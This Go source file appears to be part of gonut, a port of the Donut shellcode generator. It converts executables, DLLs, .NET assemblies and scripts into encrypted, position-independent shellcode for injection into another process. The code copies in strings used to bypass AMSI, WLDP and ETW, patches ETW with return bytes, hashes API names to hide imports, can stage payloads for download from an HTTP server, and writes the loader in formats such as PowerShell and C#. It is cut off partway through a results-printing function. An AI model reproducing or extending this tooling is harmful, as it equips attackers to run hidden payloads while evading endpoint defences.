package gonut

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"unsafe"

	"github.com/Binject/debug/pe"
	"github.com/wabzsy/compression"
)

type Gonut struct {
	Config *Config

	// DONUT_MODULE
	//ModuleLen  uint32  // size of DONUT_MODULE
	Module     Module // points to DONUT_MODULE
	ModuleData []byte

	// DONUT_INSTANCE
	Instance     Instance // points to DONUT_INSTANCE
	InstanceData []byte

	// shellcode generated from configuration
	PicData []byte // points to loader/shellcode

	FileInfo FileInfo // input file info
}

// Create
// donut/donut.c
// EXPORT_FUNC int DonutCreate(PDONUT_CONFIG c) { ... }
func (o *Gonut) Create() error {
	// 1. validate the loader configuration
	if err := o.ValidateLoaderConfig(); err != nil {
		return err
	}

	// 2. get information about the file to execute in memory
	if err := o.ReadFileInfo(); err != nil {
		return err
	}

	// 3. validate the module configuration
	if err := o.ValidateFileInfo(); err != nil {
		return err
	}

	// 4. build the module
	if err := o.BuildModule(); err != nil {
		return err
	}

	// 5. build the instance
	if err := o.BuildInstance(); err != nil {
		return err
	}

	// 6. build the loader
	if err := o.BuildLoader(); err != nil {
		return err
	}

	// 7. save loader and any additional files to disk
	return o.SaveLoader()
}

// ReadFileInfo
// Reads information about the input file.
// donut/donut.c
// static int read_file_info(PDONUT_CONFIG c) { ... }
func (o *Gonut) ReadFileInfo() error {
	o.DPRINT("Checking extension of %s", o.Config.Input)
	ext := strings.ToLower(filepath.Ext(o.Config.Input))
	if ext == "" {
		return fmt.Errorf("input file has no extension")
	}

	o.DPRINT("Extension is '%s'", ext)

	switch ext {
	case ".vbs":
		o.DPRINT("File is VBS")
		o.FileInfo.Type = DONUT_MODULE_VBS
		o.FileInfo.Arch = DONUT_ARCH_ANY
	case ".js":
		o.DPRINT("File is JS")
		o.FileInfo.Type = DONUT_MODULE_JS
		o.FileInfo.Arch = DONUT_ARCH_ANY
	case ".exe":
		o.DPRINT("File is EXE")
		o.FileInfo.Type = DONUT_MODULE_EXE
	case ".dll":
		o.DPRINT("File is DLL")
		o.FileInfo.Type = DONUT_MODULE_DLL
	default:
		return fmt.Errorf("don't recognize file extension: '%s'", ext)
	}

	var err error
	if o.Config.InputBin == nil {
		o.Config.InputBin, err = os.ReadFile(o.Config.Input)
		if err != nil {
			o.DPRINT("Unable to open %s for reading.", o.Config.Input)
			return err
		}
	}

	o.FileInfo.Data = o.Config.InputBin

	// file is EXE or DLL?
	if o.FileInfo.Type == DONUT_MODULE_EXE || o.FileInfo.Type == DONUT_MODULE_DLL {
		// Use Binject's debug/pe instead of donut's valid_dos_hdr/valid_nt_hdr/etc.
		// https://github.com/Binject/debug/tree/master/pe

		o.FileInfo.PeFile, err = pe.NewFile(bytes.NewReader(o.FileInfo.Data))
		if err != nil {
			return err
		}

		// set the CPU architecture for file
		if o.FileInfo.PeFile.Machine == pe.IMAGE_FILE_MACHINE_I386 {
			o.DPRINT("Detected architectures are: x86")
			o.FileInfo.Arch = DONUT_ARCH_X86
		} else if o.FileInfo.PeFile.Machine == pe.IMAGE_FILE_MACHINE_AMD64 {
			o.DPRINT("Detected architectures are: x64")
			o.FileInfo.Arch = DONUT_ARCH_X64
		} else {
			return fmt.Errorf("unsupported PE file architecture: 0x%x", o.FileInfo.PeFile.Machine)
		}

		// TODO: isDLL? dll = nt->FileHeader.Characteristics & IMAGE_FILE_DLL;

		// if COM directory present
		if o.FileInfo.PeFile.IsManaged() {
			o.DPRINT("COM Directory found indicates .NET assembly.")

			// TODO: if it has an export address table, we assume it's a .NET mixed assembly.
			//  curently unsupported by the PE loader.
			// if exports, err := peFile.Exports(); err == nil {
			// 	o.DPRINT("Exports: %+v", exports)
			// }

			// set type to EXE or DLL assembly
			// TODO: fi.type = (dll) ? DONUT_MODULE_NET_DLL : DONUT_MODULE_NET_EXE;
			if o.FileInfo.Type == DONUT_MODULE_EXE {
				o.FileInfo.Type = DONUT_MODULE_NET_EXE
			} else {
				o.FileInfo.Type = DONUT_MODULE_NET_DLL
			}

			o.FileInfo.Ver = "v4.0.30319"

			// try read the runtime version from meta header
			if o.FileInfo.PeFile.NetCLRVersion() != "" {
				o.FileInfo.Ver = o.FileInfo.PeFile.NetCLRVersion()
				o.DPRINT("Runtime version: %s", o.FileInfo.Ver)
			}
		}
	}

	// assign type to configuration
	o.Config.ModuleType = o.FileInfo.Type

	return nil
}

// BuildModule Create a Donut module from Donut configuration
// donut/donut.c
// static int build_module(PDONUT_CONFIG c) { ... }
func (o *Gonut) BuildModule() (err error) {

	// Compress the input file?
	if o.Config.GonutCompress != GONUT_COMPRESS_NONE {
		o.DPRINT("Compressing...")
		switch o.Config.GonutCompress {
		case GONUT_COMPRESS_APLIB:
			o.FileInfo.ZData, err = compression.APLibCompress(o.FileInfo.Data)
			o.Config.Compress = DONUT_COMPRESS_APLIB
		case GONUT_COMPRESS_LZNT1:
			o.FileInfo.ZData, err = compression.LZNT1Compress(o.FileInfo.Data)
			o.Config.Compress = DONUT_COMPRESS_LZNT1
		case GONUT_COMPRESS_LZNT1_RTL:
			o.FileInfo.ZData, err = compression.RtlLZNT1Compress(o.FileInfo.Data)
			o.Config.Compress = DONUT_COMPRESS_LZNT1
		case GONUT_COMPRESS_XPRESS:
			o.FileInfo.ZData, err = compression.XPressCompress(o.FileInfo.Data)
			o.Config.Compress = DONUT_COMPRESS_XPRESS
		case GONUT_COMPRESS_XPRESS_RTL:
			o.FileInfo.ZData, err = compression.RtlXPressCompress(o.FileInfo.Data)
			o.Config.Compress = DONUT_COMPRESS_XPRESS
		}

		if err != nil {
			o.DPRINT("Failed to compress data: %s", err)
			return err
		}

		o.DSave("g_compressed", o.FileInfo.ZData)

		o.Module.Data = o.FileInfo.ZData
	} else {
		o.Config.Compress = DONUT_COMPRESS_NONE
		o.Module.Data = o.FileInfo.Data
	}

	// Set the module info
	o.Module.Type = o.Config.ModuleType
	o.Module.Compress = o.Config.Compress
	o.Module.Len = o.FileInfo.Len()
	o.Module.ZLen = o.FileInfo.ZLen()
	o.Module.Thread = o.Config.Thread.ToUint32()
	o.Module.Unicode = o.Config.Unicode.ToUint32()

	// DotNet assembly?
	if o.Module.Type == DONUT_MODULE_NET_DLL || o.Module.Type == DONUT_MODULE_NET_EXE {
		// If no domain name specified in configuration
		if o.Config.Domain == "" {
			// if entropy is enabled
			if o.Config.Entropy != DONUT_ENTROPY_NONE {
				// generate a random name
				o.Config.Domain = GenRandomString(DONUT_DOMAIN_LEN)
			}
		}

		o.DPRINT("Domain: %s", o.Config.Domain)

		if o.Config.Domain != "" {
			// Set the domain name in module
			copy(o.Module.Domain[:DONUT_DOMAIN_LEN], o.Config.Domain)
		}

		// Assembly is DLL? Copy the class and method
		if o.Module.Type == DONUT_MODULE_NET_DLL {
			o.DPRINT("Class: %s", o.Config.Class)
			copy(o.Module.Cls[:DONUT_MAX_NAME-1], o.Config.Class)

			o.DPRINT("Method: %s", o.Config.Method)
			copy(o.Module.Method[:DONUT_MAX_NAME-1], o.Config.Method)
		}

		// If no runtime specified in configuration, use version from assembly
		if o.Config.Runtime == "" {
			o.Config.Runtime = o.FileInfo.Ver
		}

		o.DPRINT("Runtime: %s", o.Config.Runtime)
		copy(o.Module.Runtime[:DONUT_MAX_NAME-1], o.Config.Runtime)

	} else
	// Unmanaged DLL? copy function name to module
	if o.Module.Type == DONUT_MODULE_DLL && o.Config.Method != "" {
		o.DPRINT("DLL function: %s", o.Config.Method)
		copy(o.Module.Method[:DONUT_MAX_NAME-1], o.Config.Method)
	}

	// Parameters specified?
	if o.Config.Args != "" {
		if o.Module.Type == DONUT_MODULE_EXE {
			// If entropy is disabled
			if o.Config.Entropy == DONUT_ENTROPY_NONE {
				// Set to "AAAA"
				o.Config.Args = "AAAA " + o.Config.Args
				//copy(o.Module.Args[:4], "AAAA")
			} else {
				// Generate 4-byte random name
				o.Config.Args = GenRandomString(4) + " " + o.Config.Args
				//copy(o.Module.Args[:4], GenRandomString(4))
			}
			// Add space
			//o.Module.Args[4] = ' '
		}

		// Copy parameters
		//copy(o.Module.Args[:DONUT_MAX_NAME-6], o.Config.Args)
		copy(o.Module.Args[:DONUT_MAX_NAME], o.Config.Args)
		o.DPRINT("Module Args: %s", o.Config.Args)
	}

	o.DPRINT("Copying data to module")

	o.ModuleData = o.Module.ToBytes()

	o.DPRINT("Leaving without error")
	return nil
}

// BuildInstance Creates the data necessary for main loader to execute VBS/JS/EXE/DLL files in memory.
// donut/donut.c
// static int build_instance(PDONUT_CONFIG c) { ... }
func (o *Gonut) BuildInstance() error {
	o.DPRINT("Entering.")
	// Allocate memory for the size of instance based on the type
	o.DPRINT("Allocating memory for instance")

	// set the length of instance and pointer to it in configuration
	o.Instance.Len = uint32(unsafe.Sizeof(DonutInstance{}))
	// set the type of instance we're creating
	o.Instance.Type = o.Config.InstanceType
	// indicate if we should call RtlExitUserProcess to terminate host process
	o.Instance.ExitOpt = o.Config.ExitOpt
	// set the Original Entry Point
	o.Instance.OEP = o.Config.OEP
	// set the entropy level
	o.Instance.Entropy = o.Config.Entropy
	// set the bypass level
	o.Instance.Bypass = o.Config.Bypass
	// set the headers level
	o.Instance.Headers = o.Config.Headers
	// set the module length
	o.Instance.ModuleLen = uint64(len(o.ModuleData))

	// if the module is embedded, add the size of module
	// that will be appended to the end of structure
	if o.Instance.Type == DONUT_INSTANCE_EMBED {
		o.DPRINT("The size of module is %d bytes. Adding to size of instance.", o.Instance.ModuleLen)
		o.Instance.Len += uint32(o.Instance.ModuleLen)
	}

	o.DPRINT("Total length of instance : %d", o.Instance.Len)

	// encryption enabled?
	if o.Config.Entropy == DONUT_ENTROPY_DEFAULT {
		o.DPRINT("Generating random key for instance")
		// copy local key to configuration
		if err := BytesToStruct(GenRandomBytes(int(unsafe.Sizeof(Crypt{}))), &o.Instance.Key); err != nil {
			o.DPRINT("Generating random key for instance failed: %s", err)
			return err
		}
		o.DPRINT("Instance.Key.MasterKey: %x Instance.Key.CounterNonce: %x", o.Instance.Key.MasterKey, o.Instance.Key.CounterNonce)

		o.DPRINT("Generating random key for module")
		// copy local key to configuration
		if err := BytesToStruct(GenRandomBytes(int(unsafe.Sizeof(Crypt{}))), &o.Instance.ModuleKey); err != nil {
			o.DPRINT("Generating random key for instance failed: %s", err)
			return err
		}
		o.DPRINT("Instance.ModuleKey.MasterKey: %x Instance.ModuleKey.CounterNonce: %x", o.Instance.ModuleKey.MasterKey, o.Instance.ModuleKey.CounterNonce)

		o.DPRINT("Generating random string to verify decryption")
		copy(o.Instance.Sig[:DONUT_SIG_LEN], GenRandomBytes(DONUT_SIG_LEN))
		o.DPRINT("Sig: %X", o.Instance.Sig[:DONUT_SIG_LEN])

		o.DPRINT("Generating random IV for Maru hash")
		o.Instance.Iv = binary.LittleEndian.Uint64(GenRandomBytes(MARU_IV_LEN))

	}
	o.DPRINT("Generating hashes for API using IV: %016X", o.Instance.Iv)

	for cnt, item := range ApiImports {
		// calculate hash for DLL string
		dllHash := Maru([]byte(item.Module), o.Instance.Iv)

		// calculate hash for API string.
		// xor with DLL hash and store in instance
		o.Instance.Hash[cnt] = Maru([]byte(item.Name), o.Instance.Iv) ^ dllHash

		o.DPRINT("Hash for %s: %s = %016X", item.Module, item.Name, o.Instance.Hash[cnt])
	}

	o.DPRINT("Setting number of API to %d", len(ApiImports))
	o.Instance.ApiCount = uint32(len(ApiImports))

	o.DPRINT("Setting DLL names to %s", DLL_NAMES)
	copy(o.Instance.DllNames[:], DLL_NAMES)

	// if module is .NET assembly
	if o.Module.Type == DONUT_MODULE_NET_DLL || o.Module.Type == DONUT_MODULE_NET_EXE {
		o.DPRINT("Copying GUID structures and DLL strings for loading .NET assemblies")
		o.Instance.X_IID_AppDomain = X_IID_AppDomain
		o.Instance.X_IID_ICLRMetaHost = X_IID_ICLRMetaHost
		o.Instance.X_CLSID_CLRMetaHost = X_CLSID_CLRMetaHost
		o.Instance.X_IID_ICLRRuntimeInfo = X_IID_ICLRRuntimeInfo
		o.Instance.X_IID_ICorRuntimeHost = X_IID_ICorRuntimeHost
		o.Instance.X_CLSID_CorRuntimeHost = X_CLSID_CorRuntimeHost
	} else
	// if module is VBS or JS
	if o.Module.Type == DONUT_MODULE_VBS || o.Module.Type == DONUT_MODULE_JS {
		o.DPRINT("Copying GUID structures and DLL strings for loading VBS/JS")
		o.Instance.X_IID_IUnknown = X_IID_IUnknown
		o.Instance.X_IID_IDispatch = X_IID_IDispatch
		o.Instance.X_IID_IHost = X_IID_IHost
		o.Instance.X_IID_IActiveScript = X_IID_IActiveScript
		o.Instance.X_IID_IActiveScriptSite = X_IID_IActiveScriptSite
		o.Instance.X_IID_IActiveScriptSiteWindow = X_IID_IActiveScriptSiteWindow
		o.Instance.X_IID_IActiveScriptParse32 = X_IID_IActiveScriptParse32
		o.Instance.X_IID_IActiveScriptParse64 = X_IID_IActiveScriptParse64
		copy(o.Instance.Wscript[:], "WScript")
		copy(o.Instance.WscriptExe[:], "wscript.exe")

		if o.Module.Type == DONUT_MODULE_VBS {
			o.Instance.X_CLSID_ScriptLanguage = X_CLSID_VBScript
		} else {
			o.Instance.X_CLSID_ScriptLanguage = X_CLSID_JScript
		}
	}

	// if bypassing enabled, copy these strings over
	if o.Config.Bypass != DONUT_BYPASS_NONE {
		o.DPRINT("Copying strings required to bypass AMSI")

		copy(o.Instance.Clr[:], "clr")
		copy(o.Instance.Amsi[:], "amsi")
		copy(o.Instance.AmsiInit[:], "AmsiInitialize")
		copy(o.Instance.AmsiScanBuf[:], "AmsiScanBuffer")
		copy(o.Instance.AmsiScanStr[:], "AmsiScanString")

		o.DPRINT("Copying strings required to bypass WLDP")

		copy(o.Instance.Wldp[:], "wldp")
		copy(o.Instance.WldpQuery[:], "WldpQueryDynamicCodeTrust")
		copy(o.Instance.WldpIsApproved[:], "WldpIsClassInApprovedList")

		o.DPRINT("Copying strings required to bypass ETW")
		copy(o.Instance.Ntdll[:], "ntdll")
		copy(o.Instance.EtwEventWrite[:], "EtwEventWrite")
		copy(o.Instance.EtwEventUnregister[:], "EtwEventUnregister")
		copy(o.Instance.EtwRet64[:], "\xc3")
		copy(o.Instance.EtwRet32[:], "\xc2\x14\x00\x00")
	}

	// if module is an unmanaged EXE
	if o.Module.Type == DONUT_MODULE_EXE {
		// does the user specify parameters for the command line?
		if o.Config.Args != "" {
			o.DPRINT("Copying strings required to replace command line.")

			copy(o.Instance.DataName[:], ".data")
			copy(o.Instance.KernelBase[:], "kernelbase")
			copy(o.Instance.CmdSymbols[:], "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv")
		}
		// does user want loader to run the entrypoint as a thread?
		if o.Config.Thread {
			o.DPRINT("Copying strings required to intercept exit-related API")
			// these exit-related API will be replaced with pointer to RtlExitUserThread
			copy(o.Instance.ExitApi[:], "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit;_o_exit")
		}
	}

	// decoy module path
	copy(o.Instance.Decoy[:], o.Config.Decoy)

	// if the module will be downloaded
	// set the URL parameter and request verb
	if o.Instance.Type == DONUT_INSTANCE_HTTP {
		// if no module name specified
		if o.Config.ModuleName == "" {
			// if entropy disabled
			if o.Config.Entropy == DONUT_ENTROPY_NONE {
				// set to "AAAAAAAA"
				o.Config.ModuleName = "AAAAAAAA" // DONUT_MAX_MODNAME
			} else {
				// generate a random name for module
				// that will be saved to disk
				o.DPRINT("Generating random name for module")
				o.Config.ModuleName = GenRandomString(DONUT_MAX_MODNAME)
			}
			o.DPRINT("Name for module: %s", o.Config.ModuleName)
		}
		// server url + module name
		copy(o.Instance.Server[:], o.Config.Server+o.Config.ModuleName)
		// set the request verb
		copy(o.Instance.HTTPReq[:], "GET")

		o.DPRINT("Loader will attempt to download module from : %s", o.Instance.Server)

		// encrypt module?
		if o.Config.Entropy == DONUT_ENTROPY_DEFAULT {
			o.DPRINT("Encrypting module")

			o.Module.Mac = Maru(o.Instance.Sig[:DONUT_SIG_LEN], o.Instance.Iv)

			o.ModuleData = DonutEncrypt(o.Instance.ModuleKey.MasterKey, o.Instance.ModuleKey.CounterNonce[:], o.Module.ToBytes())
		}
	} else
	// if embedded, copy module to instance
	if o.Instance.Type == DONUT_INSTANCE_EMBED {
		o.DPRINT("Copying module data to instance")
		o.Instance.ModuleData = o.ModuleData
	}

	o.InstanceData = o.Instance.ToBytes()

	// encrypt instance?
	if o.Config.Entropy == DONUT_ENTROPY_DEFAULT {
		o.DPRINT("Encrypting instance")

		o.Instance.Mac = Maru(o.Instance.Sig[:DONUT_SIG_LEN], o.Instance.Iv)
		o.DPRINT("Instance.Mac: 0x%016X", o.Instance.Mac)

		// 此处需要重新ToBytes一下以应用Mac值
		o.InstanceData = o.Instance.ToBytes()

		offset := unsafe.Offsetof(o.Instance.ApiCount)
		o.InstanceData = append(o.InstanceData[:offset],
			DonutEncrypt(o.Instance.Key.MasterKey, o.Instance.Key.CounterNonce[:], o.InstanceData[offset:])...,
		)
	}

	o.DPRINT("Leaving without error")
	return nil
}

// BuildLoader Builds the shellcode that's injected into remote process.
// donut/donut.c
// static int build_loader(PDONUT_CONFIG c) { ... }
func (o *Gonut) BuildLoader() error {
	// x64 栈对齐指令
	var LOADER_EXE_X64_RSP_ALIGN = []byte{
		0x55,             // push rbp
		0x48, 0x89, 0xE5, // mov rbp, rsp
		0x48, 0x83, 0xE4, 0xF0, // and rsp, -0x10
		0x48, 0x83, 0xEC, 0x20, // sub rsp, 0x20
		0xE8, 0x05, 0x00, 0x00, 0x00, // call $ + 5
		0x48, 0x89, 0xEC, // mov rsp, rbp
		0x5D, // pop rbp
		0xC3, // ret
	}

	loaderSize := 0
	// 计算所需空间大小
	if o.Config.Arch == DONUT_ARCH_X86 {
		loaderSize = len(LOADER_EXE_X86) + int(o.Instance.Len) + 32
	} else if o.Config.Arch == DONUT_ARCH_X64 {
		loaderSize = len(LOADER_EXE_X64_RSP_ALIGN) + len(LOADER_EXE_X64) + int(o.Instance.Len) + 32
	} else if o.Config.Arch == DONUT_ARCH_X96 {
		loaderSize = len(LOADER_EXE_X86) + len(LOADER_EXE_X64_RSP_ALIGN) + len(LOADER_EXE_X64) + int(o.Instance.Len) + 32
	}

	pl := NewPicGenerator(uint32(loaderSize))

	// call $ + inst_len
	pl.PutByte(0xE8)
	pl.PutUint32(o.Instance.Len)
	pl.PutBytes(o.InstanceData)

	// pop ecx
	pl.PutByte(0x59)

	if o.Config.Arch == DONUT_ARCH_X86 {
		// pop edx
		pl.PutByte(0x5A)
		// push ecx
		pl.PutByte(0x51)
		// push edx
		pl.PutByte(0x52)

		o.DPRINT("Copying %d bytes of x86 shellcode", len(LOADER_EXE_X86))
		pl.PutBytes(LOADER_EXE_X86)

	} else if o.Config.Arch == DONUT_ARCH_X64 {
		o.DPRINT("Copying %d bytes of amd64 shellcode", len(LOADER_EXE_X64))

		// ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention
		pl.PutBytes(LOADER_EXE_X64_RSP_ALIGN)
		pl.PutBytes(LOADER_EXE_X64)

	} else if o.Config.Arch == DONUT_ARCH_X96 {
		o.DPRINT("Copying %d bytes of x86 + amd64 shellcode", len(LOADER_EXE_X86)+len(LOADER_EXE_X64))

		// xor eax, eax
		pl.PutByte(0x31)
		pl.PutByte(0xC0)
		// dec eax
		pl.PutByte(0x48)
		// js dword x86_code
		pl.PutByte(0x0F)
		pl.PutByte(0x88)
		pl.PutUint32(uint32(len(LOADER_EXE_X64_RSP_ALIGN) + len(LOADER_EXE_X64)))

		// ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention
		pl.PutBytes(LOADER_EXE_X64_RSP_ALIGN)
		pl.PutBytes(LOADER_EXE_X64)

		// pop edx
		pl.PutByte(0x5A)
		// push ecx
		pl.PutByte(0x51)
		// push edx
		pl.PutByte(0x52)
		pl.PutBytes(LOADER_EXE_X86)
	}

	o.PicData = pl.Result()
	o.DPRINT("len(o.PicData): %d", len(o.PicData))
	return nil
}

// SaveLoader Saves the loader to output file. Also saves instance for debug builds.
// If the instance type is HTTP, it saves the module to file.
// donut/donut.c
// static int save_loader(PDONUT_CONFIG c) { ... }
func (o *Gonut) SaveLoader() (err error) {

	// if DEBUG is defined, save module and instance to disk
	o.DSave("g_module", o.ModuleData)
	o.DSave("g_instance", o.InstanceData)

	// If the module will be stored on a remote server
	if o.Instance.Type == DONUT_INSTANCE_HTTP {
		o.DPRINT("Saving %s to file.", o.Config.ModuleName)
		if err = os.WriteFile(o.Config.ModuleName, o.InstanceData, 0666); err != nil {
			return err
		}
	}

	tpl := NewFormatTemplate(o.PicData)

	switch o.Config.Format {
	case DONUT_FORMAT_BINARY:
		o.DPRINT("Saving loader as binary")
		err = o.Save(tpl.ToBinary)
	case DONUT_FORMAT_BASE64:
		o.DPRINT("Saving loader as base64 string")
		err = o.Save(tpl.ToBase64)
	case DONUT_FORMAT_RUBY, DONUT_FORMAT_C:
		o.DPRINT("Saving loader as C/Ruby string")
		err = o.Save(tpl.ToRubyC)
	case DONUT_FORMAT_PYTHON:
		o.DPRINT("Saving loader as Python string")
		err = o.Save(tpl.ToPython)
	case DONUT_FORMAT_POWERSHELL:
		o.DPRINT("Saving loader as Powershell string")
		err = o.Save(tpl.ToPowerShell)
	case DONUT_FORMAT_CSHARP:
		o.DPRINT("Saving loader as C# string")
		err = o.Save(tpl.ToCSharp)
	case DONUT_FORMAT_HEX:
		o.DPRINT("Saving loader as Hex string")
		err = o.Save(tpl.ToHex)
	case DONUT_FORMAT_UUID:
		o.DPRINT("Saving loader as UUID string")
		err = o.Save(tpl.ToUUID)
	case DONUT_FORMAT_GO:
		o.DPRINT("Saving loader as Golang string")
		err = o.Save(tpl.ToGolang)
	case DONUT_FORMAT_RUST:
		o.DPRINT("Saving loader as Rust string")
		err = o.Save(tpl.ToRust)
	}

	o.DPRINT("Leaving with error: %+v", err)
	return err
}

// ValidateFileInfo
// Validates configuration for the input file.
// donut/donut.c
// static int validate_file_cfg(PDONUT_CONFIG c) { ... }
func (o *Gonut) ValidateFileInfo() error {
	o.DPRINT("Validating configuration for input file.")
	// Unmanaged EXE/DLL?
	if o.FileInfo.Type == DONUT_MODULE_DLL ||
		o.FileInfo.Type == DONUT_MODULE_EXE {
		// Requested shellcode is x86, but file is x64?
		if (o.Config.Arch == DONUT_ARCH_X86 && o.FileInfo.Arch == DONUT_ARCH_X64) ||
			// Requested shellcode is x64, but file is x86?
			(o.Config.Arch == DONUT_ARCH_X64 && o.FileInfo.Arch == DONUT_ARCH_X86) {
			return fmt.Errorf("target architecture %d is not compatible with DLL/EXE %d", o.Config.Arch, o.FileInfo.Arch)
		}
		// DLL function specified. Does it exist?
		if o.FileInfo.Type == DONUT_MODULE_DLL && o.Config.Method != "" {
			if err := o.IsDllExport(o.Config.Method); err != nil {
				return err
			}
		}
	}

	// .NET DLL assembly?
	if o.FileInfo.Type == DONUT_MODULE_NET_DLL {
		// DLL requires class and method
		if o.Config.Class == "" || o.Config.Method == "" {
			return fmt.Errorf("input file is a .NET assembly, but no class and method have been specified")
		}
	}

	// is this an unmanaged DLL with parameters?
	if o.FileInfo.Type == DONUT_MODULE_DLL && o.Config.Args != "" {
		// we need a DLL function
		if o.Config.Method == "" {
			return fmt.Errorf("parameters are provided for an unmanaged/native DLL, but no function")
		}
	}

	o.DPRINT("Validation passed.")
	return nil
}

// ValidateLoaderConfig
// Validates Donut configuration for loader.
// donut/donut.c
// static int validate_loader_cfg(PDONUT_CONFIG c) { ... }
func (o *Gonut) ValidateLoaderConfig() error {
	o.DPRINT("Validating configuration.")
	//if o.Config.Input == "" {
	//	return fmt.Errorf("no input file")
	//}

	// check ExitOpt
	switch o.Config.ExitOpt {
	case
		DONUT_OPT_EXIT_THREAD,
		DONUT_OPT_EXIT_PROCESS,
		DONUT_OPT_EXIT_BLOCK:
	default:
		return fmt.Errorf("invalid `exit option` specified: %d", o.Config.ExitOpt)
	}

	// check Arch
	switch o.Config.Arch {
	case
		DONUT_ARCH_X86,
		DONUT_ARCH_X64,
		DONUT_ARCH_X96:
	default:
		return fmt.Errorf("invalid `architecture option` specified: %d", o.Config.Arch)
	}

	// check Bypass
	switch o.Config.Bypass {
	case
		DONUT_BYPASS_NONE,
		DONUT_BYPASS_ABORT,
		DONUT_BYPASS_CONTINUE:
	default:
		return fmt.Errorf("invalid `bypass option` specified: %d", o.Config.Bypass)
	}

	// check Headers
	switch o.Config.Headers {
	case DONUT_HEADERS_OVERWRITE,
		DONUT_HEADERS_KEEP:
	default:
		return fmt.Errorf("invalid `headers option` specified: %d", o.Config.Headers)
	}

	// check Entropy
	switch o.Config.Entropy {
	case
		DONUT_ENTROPY_NONE,
		DONUT_ENTROPY_RANDOM,
		DONUT_ENTROPY_DEFAULT:
	default:
		return fmt.Errorf("invalid `entropy option` specified: %d", o.Config.Entropy)
	}

	// check Format
	switch o.Config.Format {
	case
		DONUT_FORMAT_BINARY,
		DONUT_FORMAT_BASE64,
		DONUT_FORMAT_C,
		DONUT_FORMAT_RUBY,
		DONUT_FORMAT_PYTHON,
		DONUT_FORMAT_POWERSHELL,
		DONUT_FORMAT_CSHARP,
		DONUT_FORMAT_HEX,
		DONUT_FORMAT_GO,
		DONUT_FORMAT_RUST,
		DONUT_FORMAT_UUID:
	default:
		return fmt.Errorf("invalid `format option` specified: %d", o.Config.Format)
	}

	// check Compress
	switch o.Config.GonutCompress {
	case
		GONUT_COMPRESS_NONE,
		GONUT_COMPRESS_APLIB,
		GONUT_COMPRESS_LZNT1,
		GONUT_COMPRESS_XPRESS:
	case
		GONUT_COMPRESS_LZNT1_RTL,
		GONUT_COMPRESS_XPRESS_RTL:
		if runtime.GOOS != "windows" {
			return fmt.Errorf("RtlCompressBuffer is only available on Windows systems")
		}
	default:
		return fmt.Errorf("invalid `compress option` specified: %d", o.Config.GonutCompress)
	}

	o.Config.InstanceType = DONUT_INSTANCE_EMBED
	// server specified?
	if o.Config.Server != "" {
		o.Config.InstanceType = DONUT_INSTANCE_HTTP
		u, err := url.Parse(o.Config.Server)
		if err != nil {
			return err
		}

		if u.Scheme != "http" && u.Scheme != "https" {
			return fmt.Errorf("URL is invalid: %s", o.Config.Server)
		}

		urlLen := len(o.Config.Server)

		if urlLen <= 8 {
			return fmt.Errorf("URL length: %d is invalid", urlLen)
		}

		if o.Config.Server[urlLen-1] != '/' {
			o.Config.Server += "/"
			urlLen++
		}

		if urlLen+DONUT_MAX_MODNAME >= DONUT_MAX_NAME {
			return fmt.Errorf("URL length: %d exceeds size of buffer: %d", urlLen+DONUT_MAX_MODNAME, DONUT_MAX_NAME)
		}
	}

	// no output file specified?
	if o.Config.Output != "" {
		// set to default name based on format
		if filepath.Ext(o.Config.Output) == "" {
			switch o.Config.Format {
			case DONUT_FORMAT_BINARY:
				o.Config.Output += ".bin"
			case DONUT_FORMAT_BASE64:
				o.Config.Output += ".b64"
			case DONUT_FORMAT_RUBY:
				o.Config.Output += ".rb"
			case DONUT_FORMAT_C:
				o.Config.Output += ".c"
			case DONUT_FORMAT_PYTHON:
				o.Config.Output += ".py"
			case DONUT_FORMAT_POWERSHELL:
				o.Config.Output += ".ps1"
			case DONUT_FORMAT_CSHARP:
				o.Config.Output += ".cs"
			case DONUT_FORMAT_HEX:
				o.Config.Output += ".hex"
			case DONUT_FORMAT_UUID:
				o.Config.Output += ".uuid"
			case DONUT_FORMAT_GO:
				o.Config.Output += ".go"
			case DONUT_FORMAT_RUST:
				o.Config.Output += ".rs"
			}
		}
	}

	o.DPRINT("Loader configuration passed validation.")
	return nil
}

// IsDllExport
// Validates if a DLL exports a function.
// donut/donut.c
// static int is_dll_export(const char *function) { ... }
// Use Binject's debug/pe instead of donut's is_dll_export
// https://github.com/Binject/debug/tree/master/pe
func (o *Gonut) IsDllExport(method string) error {
	exports, err := o.FileInfo.PeFile.Exports()
	if err != nil {
		return err
	}

	o.DPRINT("Number of exported functions: %d", len(exports))
	// scan array for symbol
	for _, v := range exports {
		o.DPRINT("0x%08x: %s", v.VirtualAddress, v.Name)
		// if match found, exit
		if v.Name == method {
			o.DPRINT("Found API: %s", v.Name)
			return nil
		}
	}

	return fmt.Errorf("unable to locate function '%s' in DLL", o.Config.Method)
}

func (o *Gonut) DPRINT(format string, v ...any) {
	if o.Config.Verbose {
		log.Printf("[DEBUG] "+format+"\n", v...)
	}
}

func (o *Gonut) DSave(name string, data []byte) {
	if o.Config.Verbose {
		o.DPRINT("Saving %s to file. %d bytes.", name, len(data))
		if err := os.WriteFile(name, data, 0666); err != nil {
			panic(err)
		}
	}
}

func (o *Gonut) Save(templateFn func() []byte) error {
	if o.Config.Output != "" {
		return os.WriteFile(o.Config.Output, templateFn(), 0666)
	} else {
		return nil
	}
}

func (o *Gonut) ShowResults() {

	fmt.Println("[Config]")
	fmt.Println("    Compression   :", o.Config.GonutCompress.Name())
	fmt.Println("    Input         :", o.Config.Input)
	fmt.Println("    Target CPU    :", o.Config.Arch.Name())

	fmt.Println("[Module]")
	fmt.Println("    Type                 :", o.Module.Type.Name())
	fmt.Println("    Architecture         :", o.FileInfo.Arch.Name())
	fmt.Println("    Compression          :", o.Module.Compress.Name())
	fmt.Println("    Length(uncompressed) :", o.Module.Len)
	fmt.Println("    Length(compressed)   :", o.Module.ZLen)
	fmt.Println("    Thread               :", o.Config.Thread.Name())
	fmt.Println("    Unicode              :", o.Config.Unicode.Name())
	if o.Module.Args[0] != 0x00 {
		fmt.Println("    Arguments            :", string(o.Module.Args[:]))
	}

	if o.Config.ModuleType == DONUT_MODULE_NET_DLL {
		fmt.Println("    .NET Runtime         :", string(o.Module.Runtime[:]))
